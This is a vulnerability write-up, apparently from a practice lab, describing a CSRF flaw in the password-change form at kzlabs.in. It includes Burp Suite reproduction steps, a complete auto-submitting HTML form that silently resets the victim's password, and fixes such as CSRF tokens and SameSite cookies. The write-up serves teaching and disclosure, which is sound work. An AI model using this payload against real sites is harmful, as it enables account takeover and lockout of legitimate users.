# Cross-Site Request Forgery (CSRF) Leading to Unauthorized Password Change

## Vulnerability Type

Cross-Site Request Forgery (CSRF)

## Summary

The application accepts password change requests without implementing anti-CSRF protections.

An attacker can craft a malicious webpage that automatically submits a password change request on behalf of an authenticated victim, resulting in an unauthorized password modification.

## Vulnerable Endpoint

```http
https://kzlabs.in/1307.php?action=settings
```

### Vulnerable Parameters

```http
new_password
confirm_password
```

## Steps to Reproduce

1. Log in to the application.
2. Navigate to the Settings page.
3. Change the password and intercept the request using Burp Suite.
4. Observe that the request does not contain a CSRF token.
5. Right-click the request and select **Engagement Tools → Generate CSRF PoC**.
6. Save the generated HTML file.
7. Open the HTML file while authenticated to the application.
8. Observe that the password is changed automatically without user interaction.

## Payload Used

```html
<html>
<body>
<form action="https://kzlabs.in/1307.php?action=settings" method="POST">
<input type="hidden" name="new_password" value="new" />
<input type="hidden" name="confirm_password" value="new" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

The application accepts a forged password change request and updates the victim's password using the active authenticated session.

## Impact

* Unauthorized password changes
* Account lockout of legitimate users
* Potential account takeover
* Abuse of authenticated user sessions

## Recommendations for Fix

* Implement anti-CSRF tokens for all state-changing requests
* Validate the `Origin` and `Referer` headers
* Use `SameSite=Lax` or `SameSite=Strict` cookies
* Require the current password before allowing password changes
* Re-authenticate users before sensitive account modifications
